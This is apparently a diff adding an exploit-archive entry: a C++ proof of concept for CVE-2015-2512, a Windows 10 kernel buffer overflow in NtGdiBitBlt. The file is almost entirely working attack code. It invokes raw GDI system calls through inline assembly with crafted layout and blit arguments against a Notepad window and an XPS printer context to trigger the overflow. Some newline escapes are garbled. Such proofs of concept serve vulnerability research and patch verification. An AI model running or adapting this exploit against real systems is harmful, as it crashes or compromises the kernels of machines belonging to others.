@@ -1,0 +1,91 @@
+id: 24297
+date: 09/25/2015
+title: Windows 10 kernel buffer overflow in NtGdiBitBlt PoC
+author: Nils Sommer
+cves: CVE-2015-2512
+
+/*
+* compile:
+* cl.exe bug474.cpp user32.lib gdi32.lib shell32.lib
+*/
+
+#include <stdio.h>
+#include <tchar.h>
+#include <Windows.h>
+#include <time.h>
+
+HWND notepad(LPCSTR name) {
+char filename[1024], title[1024];
+FILE *f=0x0;
+sprintf_s(filename, 1024, "%s.txt", name);
+DWORD rc = fopen_s(&f, filename, "w");
+if(rc!=0) {
+printf("[-] failed to create temporary text filen");
+}
+fclose(f);
+HINSTANCE inst = ShellExecuteA(0x0, "open", "notepad.exe", filename, 0x0, SW_SHOW);
+if(inst < (HINSTANCE)33) {
+printf("[-] failed to start notepadn");
+}
+while(1) {
+sprintf_s(title, 1024, "%s - Notepad", name);
+HWND hwnd = FindWindowA(0x0, title);
+if(hwnd) {
+return hwnd;
+}
+sprintf_s(title, 1024, "%s.txt - Notepad", name);
+hwnd = FindWindowA(0x0, title);
+if(hwnd) {
+//printf("[-] failed to retrieve handle to notepad windown");
+//return 0x0;
+return hwnd;
+}
+}
+return 0x0;
+}
+
+
+__declspec(noinline) int __stdcall NtGdiSetLayout(HDC hdc, DWORD d0, DWORD d1) {
+__asm {
+push d1
+push d0
+push hdc
+push 0x0
+mov eax, 0x1123
+mov edx, 0x7ffe0300
+call dword ptr [edx]
+add esp, 0x10
+}
+}
+
+__declspec(noinline) int __stdcall NtGdiBitBlt(HDC hdc, DWORD dw1, DWORD dw2,DWORD dw3,DWORD dw4,HDC hdc2,DWORD dw6,DWORD dw7, DWORD dw8) {
+__asm {
+push dw8
+push dw7
+push dw6
+push hdc2
+push dw4
+push dw3
+push dw2
+push dw1
+push hdc
+push 0x0
+mov eax, 0x100e
+mov edx, 0x7ffe0300
+call dword ptr [edx]
+add esp, 0x30
+}
+}
+int _tmain(int argc, _TCHAR* argv[])
+{
+HDC hdc1 = CreateDCA(0,"Microsoft XPS Document Writer", 0, 0);
+printf("[-] hdc1: %08xn", hdc1);
+NtGdiSetLayout(hdc1, 0x6d, 0xc5abb63);
+HWND hwnd1 = notepad("test1");
+printf("[-] hwnd1: %08xn", hwnd1);
+HDC hdc2 = GetDC(hwnd1);
+printf("[-] hdc2: %08xn", hdc2);
+NtGdiBitBlt(hdc1, 0, 0xae, 0x4c, 0x1a, hdc2, 0xb2, 0x47, 0x330008);
+}
+
+#  0day.today [2023-03-22]  #
